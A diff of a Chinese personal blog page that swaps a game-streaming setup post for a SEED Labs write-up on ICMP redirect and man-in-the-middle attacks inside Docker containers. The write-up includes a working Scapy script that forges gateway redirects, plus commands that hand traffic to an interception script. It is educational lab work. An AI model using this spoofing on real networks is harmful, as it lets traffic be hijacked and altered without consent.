@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html lang="zh-cn" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前言\r平时上课我喜欢带上笔记本学习，但笔记本的续航只能撑四节课，而且很沉，再带上电源的话，电脑包就完全成了一个累赘，而平板就是一个好选择。在工作室时有时学累了想打游戏，由于笔记本性能不足，就需要连接寝室里的台式来玩\n">
-<title>Sunshine&#43;Moonlight远程串流</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免历史网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n">
+<title>ICMP重定向与中间人攻击</title>
 
-<link rel='canonical' href='https://th4uma.github.io/post/streaming/'>
+<link rel='canonical' href='https://th4uma.github.io/post/icmp/'>
 
-<link rel="stylesheet" href="/scss/style.min.5808d9f960cd3176a76fafd720ebb8e0ace728f0632a73e61bfdce0587bb6582.css"><meta property='og:title' content="Sunshine+Moonlight远程串流">
-<meta property='og:description' content="前言\r平时上课我喜欢带上笔记本学习，但笔记本的续航只能撑四节课，而且很沉，再带上电源的话，电脑包就完全成了一个累赘，而平板就是一个好选择。在工作室时有时学累了想打游戏，由于笔记本性能不足，就需要连接寝室里的台式来玩\n">
-<meta property='og:url' content='https://th4uma.github.io/post/streaming/'>
+<link rel="stylesheet" href="/scss/style.min.5808d9f960cd3176a76fafd720ebb8e0ace728f0632a73e61bfdce0587bb6582.css"><meta property='og:title' content="ICMP重定向与中间人攻击">
+<meta property='og:description' content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免历史网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n">
+<meta property='og:url' content='https://th4uma.github.io/post/icmp/'>
 <meta property='og:site_name' content='Thaumazein&#39;s Shelter'>
-<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-02-17T23:35:02&#43;08:00'/><meta property='article:modified_time' content='2026-02-17T23:35:02&#43;08:00'/><meta property='og:image' content='https://th4uma.github.io/images/cover/st1.jpg' />
-<meta name="twitter:title" content="Sunshine+Moonlight远程串流">
-<meta name="twitter:description" content="前言\r平时上课我喜欢带上笔记本学习，但笔记本的续航只能撑四节课，而且很沉，再带上电源的话，电脑包就完全成了一个累赘，而平板就是一个好选择。在工作室时有时学累了想打游戏，由于笔记本性能不足，就需要连接寝室里的台式来玩\n"><meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:image" content='https://th4uma.github.io/images/cover/st1.jpg' />
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-05-10T19:08:02&#43;08:00'/><meta property='article:modified_time' content='2026-05-10T19:08:02&#43;08:00'/><meta property='og:image' content='https://th4uma.github.io/images/cover/icmp.jpg' />
+<meta name="twitter:title" content="ICMP重定向与中间人攻击">
+<meta name="twitter:description" content="实验环境\r我使用的是 Ubuntu 24.04.4，基本环境配置见ARP攻击原理学习\n启动实验前，对容器环境进行清理，避免历史网络配置干扰\n1 sudo docker system prune -f 进入实验目录并启动\n"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://th4uma.github.io/images/cover/icmp.jpg' />
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -272,21 +272,16 @@ unicode: "f6d2"
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ol>
-    <li><a href="#前言">前言</a></li>
-    <li><a href="#准备">准备</a>
+    <li><a href="#实验环境">实验环境</a></li>
+    <li><a href="#icmp-重定向攻击">ICMP 重定向攻击</a>
       <ol>
-        <li><a href="#设备">设备</a></li>
-        <li><a href="#软件">软件</a></li>
+        <li><a href="#受害者">受害者</a></li>
+        <li><a href="#攻击者">攻击者</a></li>
+        <li><a href="#验证">验证</a></li>
       </ol>
     </li>
-    <li><a href="#wol基础配置">WOL基础配置</a>
-      <ol>
-        <li><a href="#主机端设置">主机端设置</a></li>
-        <li><a href="#控制端设置">控制端设置</a></li>
-      </ol>
-    </li>
-    <li><a href="#内网串流">内网串流</a></li>
-    <li><a href="#外网串流">外网串流</a></li>
+    <li><a href="#中间人攻击mitm">中间人攻击（MITM）</a></li>
+    <li><a href="#实验中的关键点">实验中的关键点</a></li>
   </ol>
 </nav>
         </div>
@@ -302,9 +297,9 @@ unicode: "f6d2"
     <article class="has-image main-article">
     <header class="article-header">
         <div class="article-image">
-            <a href="/post/streaming/">
+            <a href="/post/icmp/">
                 
-                    <img src="/images/cover/st1.jpg" loading="lazy" alt="Featured image of post Sunshine&#43;Moonlight远程串流" />
+                    <img src="/images/cover/icmp.jpg" loading="lazy" alt="Featured image of post ICMP重定向与中间人攻击" />
                 
             </a>
         </div>
@@ -318,8 +313,8 @@ unicode: "f6d2"
                 计算机网络
             </a>
         
-            <a href="/categories/%E4%B8%B2%E6%B5%81/" >
-                串流
+            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" >
+                网络安全
             </a>
         
     </header>
@@ -327,7 +322,7 @@ unicode: "f6d2"
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/post/streaming/">Sunshine&#43;Moonlight远程串流</a>
+            <a href="/post/icmp/">ICMP重定向与中间人攻击</a>
         </h2>
     
         
@@ -349,7 +344,7 @@ unicode: "f6d2"
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">2026-02-17</time>
+                <time class="article-time--published">2026-05-10</time>
             </div>
         
 
@@ -365,83 +360,253 @@ unicode: "f6d2"
     <section class="article-content">
     
     
-    <h2 id="前言">前言
-</h2><p>平时上课我喜欢带上笔记本学习，但笔记本的续航只能撑四节课，而且很沉，再带上电源的话，电脑包就完全成了一个累赘，而平板就是一个好选择。在工作室时有时学累了想打游戏，由于笔记本性能不足，就需要连接寝室里的台式来玩</p>
-<p>因此在不改变目前设备位置与数量的情况下，我需要串流来实现我的需求</p>
-<h2 id="准备">准备
-</h2><h3 id="设备">设备
-</h3><ul>
-<li>服务端：台式电脑，笔记本</li>
-<li>客户端：手机，平板</li>
-<li>路由器：OpenWrt</li>
-</ul>
-<h3 id="软件">软件
-</h3><ul>
-<li>
-<p><a class="link" href="https://github.com/LizardByte/Sunshine/releases"  target="_blank" rel="noopener"
-    >Sunshine</a>：串流服务器</p>
-</li>
-<li>
-<p><a class="link" href="https://moonlight-stream.org/"  target="_blank" rel="noopener"
-    >Moonlight</a>：串流客户端</p>
-</li>
-<li>
-<p><a class="link" href="https://www.natpierce.cn/pc/index/index.html"  target="_blank" rel="noopener"
-    >皎月连</a>：内网穿透</p>
-</li>
-</ul>
-<h2 id="wol基础配置">WOL基础配置
-</h2><blockquote>
-<p>WOL（Wake on LAN）可以通过网络控制电脑开机，这样就解决了电脑关机情况下在外无法随时串流的问题</p>
-</blockquote>
-<p><strong>前提条件：</strong> 主板和网卡必须支持 WOL，需要使用有线网卡</p>
-<h3 id="主机端设置">主机端设置
-</h3><p>开机进入BIOS，进入高级模式，将<code>由PCI-E设备唤醒</code>设置为<code>开启</code></p>
-<p>WOL需要网卡待机供电，因此将ErP设置为<code>关闭</code></p>
-<img src="zj55.jpg" style="width: 100%;" />
-<p>打开<code>设备管理器&gt;网络适配器&gt;右键网卡&gt;属性&gt;电源管理</code>，勾选<code>允许此设备唤醒计算机</code></p>
-<img src="zj64.png" style="width: 80%;" />
-<p>进入<code>高级</code>选项卡，将<code>唤醒幻数据包</code>和<code>唤醒模式匹配</code>设置为开启</p>
-<img src="zj65.png" style="width: 50%;" />
-<h3 id="控制端设置">控制端设置
-</h3><p>手机下载<code>Fing</code>，和电脑连接同一网络</p>
-<img src="cl1.jpg" style="width: 40%;" />
-<p>点击扫描现有网络，在设备界面找到主机设备名</p>
-<img src="cl2.jpg" style="width: 40%;" />
-<p>进入主机的界面，点击<code>LAN唤醒</code>，这里会自动填写好信息，点击发送即可</p>
-<img src="cl3.jpg" style="width: 40%;" />
+    <h2 id="实验环境">实验环境
+</h2><p>我使用的是 Ubuntu  24.04.4，基本环境配置见<a class="link" href="https://th4uma.github.io/post/arp/#%e5%87%86%e5%a4%87"  target="_blank" rel="noopener"
+    >ARP攻击原理学习</a></p>
+<p>启动实验前，对容器环境进行清理，避免历史网络配置干扰</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker system prune -f
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="1.png" style="width: 100%;" />
+<p>进入实验目录并启动</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd seed-labs/category-network/ICMP_Redirect/Labsetup
+</span></span><span class="line"><span class="cl">sudo docker compose up -d
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>遇到问题：报错<code>Error response from daemon: interface specific sysctl setting &quot;net.ipv4.conf.eth0.send_redirects&quot; must be supplied using driver option 'com.docker.network.endpoint.sysctls'</code></p>
+<img src="2.png" style="width: 100%;" />
+<p>编辑<code>docker-compose.yml</code>，删除这一行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">- net.ipv4.conf.eth0.send_redirects=0
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>容器全部启动后，网络结构包括受害者、攻击者、真实网关、恶意路由器以及目标主机</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th>节点</th>
+          <th>IP 地址</th>
+          <th>作用说明</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>受害者主机</td>
+          <td>10.9.0.5</td>
+          <td>发起正常网络访问的目标主机，路由表被攻击者篡改</td>
+      </tr>
+      <tr>
+          <td>真实路由器</td>
+          <td>10.9.0.1</td>
+          <td>正常网络转发节点，作为对照路径</td>
+      </tr>
+      <tr>
+          <td>恶意路由器</td>
+          <td>10.9.0.111</td>
+          <td>被 ICMP Redirect 指定的流量目的地，同时执行 MITM 攻击</td>
+      </tr>
+      <tr>
+          <td>攻击者主机</td>
+          <td>10.9.0.105</td>
+          <td>伪造 ICMP Redirect 报文，并执行流量监听与篡改</td>
+      </tr>
+  </tbody>
+</table></div>
+<h2 id="icmp-重定向攻击">ICMP 重定向攻击
+</h2><p>ICMP Redirect 用于局域网优化路径。当主机将数据包发送给网关时，如果网关发现存在更优路径，会返回一个重定向报文，引导主机更新路由缓存。这个机制缺乏认证过程，只要报文结构合法且来源看似可信，就有可能被内核接受，因此可以伪造重定向来进行攻击</p>
+<p>攻击目标是修改受害者的路由缓存，将这个路由发往目标主机的流量转发到恶意路由器</p>
+<h3 id="受害者">受害者
+</h3><p>为了使ICMP重定向报文能够顺利通过受害者内核的合法性校验，需要让受害者持续向目标主机发送数据包</p>
+<p>进入受害者容器，执行ping命令且不中断</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker exec -it victim-10.9.0.5 bash
+</span></span><span class="line"><span class="cl">ping 192.168.60.5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>保持通信状态是触发内核接受重定向的前提</p>
+<h3 id="攻击者">攻击者
+</h3><p>首先写一个脚本<code>icmp_redirect.py</code>用来伪造来自网关的 Type 5 报文，指定受害者的流量发往恶意路由器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from scapy.all import *
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">victim_ip = &#34;10.9.0.5&#34;
+</span></span><span class="line"><span class="cl">router_ip = &#34;10.9.0.1&#34;
+</span></span><span class="line"><span class="cl">attacker_ip = &#34;10.9.0.111&#34;
+</span></span><span class="line"><span class="cl">target_ip = &#34;192.168.60.5&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ip = IP(src=router_ip, dst=victim_ip)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">icmp = ICMP(type=5, code=1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ip2 = IP(src=victim_ip, dst=target_ip)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">send_packet = ip2 / ICMP()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">redirect = IP(src=router_ip, dst=victim_ip) / \
+</span></span><span class="line"><span class="cl">           ICMP(type=5, code=1, gw=attacker_ip) / \
+</span></span><span class="line"><span class="cl">           send_packet
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">send(redirect, count=5, verbose=1)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进入攻击者容器，发送伪造的 ICMP 重定向报文</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it attacker-10.9.0.105 bash
+</span></span><span class="line"><span class="cl">cd /volumes
+</span></span><span class="line"><span class="cl">python3 icmp_redirect.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="验证">验证
+</h3><p>攻击成功后，在受害者节点查看路由缓存：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ip route show
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>若出现如下条目：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">192.168.60.5 via 10.9.0.111 dev eth0 cache &lt;redirected&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明路由已被修改，目标流量开始经过攻击者控制的节点。</p>
+<h2 id="中间人攻击mitm">中间人攻击（MITM）
+</h2><p>在路由被重定向后，攻击者已经处于通信路径中间，但默认情况下数据仍然是透明转发的，需要进一步介入数据处理流程。</p>
+<p>实验中直接在恶意路由器上对数据进行拦截和修改。</p>
+<p>在目标主机上开启监听：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it host-192.168.60.5 bash
+</span></span><span class="line"><span class="cl">nc -lp 9090
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>受害者发起连接：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">nc 192.168.60.5 9090
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>通信建立后，在恶意路由器上关闭内核转发：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">docker exec -it malicious-router-10.9.0.111 bash
+</span></span><span class="line"><span class="cl">sysctl net.ipv4.ip_forward=0
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>关闭转发的目的是避免数据包直接由内核转发，从而使用户态脚本能够接管数据路径。</p>
+<p>随后运行中间人脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cd /volumes
+</span></span><span class="line"><span class="cl">python3 mitm_nc.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>脚本通过嗅探并重构 TCP 数据，实现对通信内容的修改。</p>
+<p>在受害者端发送特定字符串，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">seedlabs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>目标主机接收到的内容被替换为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">AAAAAAAA
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>说明数据已在传输过程中被修改，中间人攻击成立。</p>
+<hr>
+<h2 id="实验中的关键点">实验中的关键点
+</h2><p>ICMP 重定向并不是无条件生效，需要存在对应的通信流量，否则内核可能直接忽略报文。</p>
+<p>路由缓存存在时间限制，实验操作需要在有效期内完成，否则需要重新触发攻击。</p>
+<p>中间人阶段如果不关闭内核转发，数据包会绕过用户态脚本，导致无法修改内容。</p>
+<p>MAC 地址配置错误容易导致网络异常甚至形成循环转发，需要保证脚本中的目标地址准确。</p>
+<hr>
 <blockquote>
-<p>如果需要远程串流，还需要进一步配置远程WOL，详见<a class="link" href="https://th4uma.github.io/post/op_add/#wake-on-lan"  target="_blank" rel="noopener"
-    >OpenWrt插件推荐与配置</a></p>
+<p>知识小结</p>
+<p>ICMP 重定向本质是对主机路由缓存的动态修改机制，在缺乏认证的情况下可以被伪造利用。</p>
+<p>攻击的核心不在于重定向本身，而在于借此进入通信路径，实现对流量的控制。</p>
+<p>中间人攻击依赖对数据路径的完全接管，单纯的流量转发无法达到篡改效果，需要在内核转发与用户态处理之间做切换。</p>
+<p>从实现上看，攻击链条可以拆分为路径劫持与数据处理两个阶段，两者缺一不可。</p>
 </blockquote>
-<h2 id="内网串流">内网串流
-</h2><p>服务端安装Sunshine，然后以管理员身份运行，这里会给出管理地址</p>
-<img src="cl7.png" style="width: 80%;" />
-<p>访问<a class="link" href="https://localhost:47990"  target="_blank" rel="noopener"
-    >管理地址</a>，第一次进入的时候浏览器会警告非私密链接，选择继续访问</p>
-<img src="cl8.png" style="width: 80%;" />
-<p>设置管理员用户名和密码，这个用户名密码是存储在本地的，必须牢记，如果忘记没办法找回，就无法进入配置页面</p>
-<img src="cl9.png" style="width: 100%;" />
-<p>确认账号密码后进行登录，然后跳转到这个界面</p>
-<img src="cl10.png" style="width: 100%;" />
-<p>调整网页语言，进入<code>Configuration&gt;General&gt;Locale</code>，选择简体中文，保存并应用</p>
-<img src="cl11.png" style="width: 100%;" />
-<p>客户端安装Moonlight，和服务端连接同一局域网，刷新后设备列表出现服务端，进行配对即可</p>
-<img src="cl5.jpg" style="width: 40%;" />
-<h2 id="外网串流">外网串流
-</h2><blockquote>
-<p>有公网IP是最好的，但很可惜我并没有，于是我选择了虚拟局域网组网。最开始用的<a class="link" href="https://th4uma.github.io/post/op_add/#zerotier"  target="_blank" rel="noopener"
-    >ZeroTier+OpenWrt方案</a>在我的环境下不可用，后来采用了电脑直接安装皎月连的方法</p>
-</blockquote>
-<p>服务端与客户端均安装<a class="link" href="https://www.natpierce.cn/pc/downloads/index_new.html"  target="_blank" rel="noopener"
-    >皎月连</a>，然后注册一个账号</p>
-<p>启动并访问<a class="link" href="http://localhost:33272"  target="_blank" rel="noopener"
-    >控制界面</a>，登录后进入<code>服务端</code>，开启组网模式并设置密码，这里就能看到虚拟局域网的IP，然后开启服务</p>
-<img src="cl13.png" style="width: 100%;" />
-<p>客户端登录后可以看到服务端设备名，选中后点击连接</p>
-<img src="cl14.jpg" style="width: 40%;" />
-<p>打开Moonlight，点击右上角的加号，输入虚拟局域网的IP地址，然后添加，可以看到设备可用，这样就可以在外进行串流了</p>
-<img src="cl15.jpg" style="width: 40%;" />
 
 </section>
 
@@ -513,25 +678,6 @@ unicode: "f6d2"
             
                 
 <article class="has-image">
-    <a href="/post/icmp/">
-        
-        
-            <div class="article-image">
-                
-                    <img src="/images/cover/icmp.jpg" loading="lazy" data-key="" data-hash="/images/cover/icmp.jpg"/>
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">ICMP重定向与中间人攻击</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
     <a href="/post/dns/">
         
         
@@ -563,6 +709,25 @@ unicode: "f6d2"
 
         <div class="article-details">
             <h2 class="article-title">ARP攻击原理学习</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/streaming/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/images/cover/st1.jpg" loading="lazy" data-key="" data-hash="/images/cover/st1.jpg"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Sunshine&#43;Moonlight远程串流</h2>
         </div>
     </a>
 </article>
